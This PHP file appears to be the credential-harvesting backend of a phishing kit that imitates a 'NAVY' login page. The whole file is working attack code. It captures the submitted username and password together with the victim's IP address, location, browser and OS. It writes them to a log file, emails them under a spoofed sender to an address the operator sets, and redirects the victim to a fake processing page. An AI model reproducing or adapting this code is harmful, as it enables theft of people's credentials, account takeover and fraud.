<?php
if (isset($_POST['USER']) && isset($_POST['PASSWORD'])) {
    session_start();
    include '../mine.php';
    $_SESSION['USER'] = $_POST['USER'];
    $_SESSION['PASSWORD'] = $_POST['PASSWORD'];
    $msg  = "=========== <[ NAVY LOGIN ]> ===========\r\n";
    $msg .= "USER       : {$_POST['USER']}\r\n";
    $msg .= "PASS       : {$_POST['PASSWORD']}\r\n";
    $msg .= "---------------------- IP Info ----------------------\r\n";
    $msg .= "IP ADDRESS : {$_SESSION['ip']}\r\n";
    $msg .= "LOCATION   : {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
    $msg .= "BROWSER    : {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
    $msg .= "TIME       : " . now() . " GMT\r\n";
    $msg .= "=========== <[ Thanks to PANDA ]> ===========\r\n\r\n\r\n";
    $save = fopen("../../mtgenetartie.txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    $subject = "NAVY NEW LOGIN [" . $_POST['USER'] . "] ";
    $headers = "From: New NAVY Login <sales@PANDA.store>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($yours, $subject, $msg, $headers);
            exit(header("Location: ../../account/proccessing"));
}else{
            exit(header('HTTP/1.0 404 Not Found'));
}
?>